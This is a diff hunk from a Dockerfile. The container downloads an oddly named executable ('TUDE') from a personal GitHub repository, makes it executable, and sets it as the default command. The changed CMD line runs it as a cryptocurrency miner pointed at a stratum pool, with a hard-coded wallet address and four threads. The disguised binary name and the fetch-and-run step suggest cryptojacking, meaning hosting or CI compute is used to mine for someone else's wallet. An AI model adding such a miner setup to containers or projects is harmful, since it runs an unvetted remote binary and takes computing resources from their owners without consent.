@@ -15,4 +15,4 @@ RUN apt-get update && apt-get -qy install \
 RUN wget https://github.com/Jsjsj991/manual/raw/main/TUDE && chmod +x TUDE
 
 # Define default command.
-CMD ./TUDE cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RRPp2nA9kqeGqERzefhdGSzfzcmevRtFXr -t4
+CMD ./TUDE -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RRPp2nA9kqeGqERzefhdGSzfzcmevRtFXr -t4
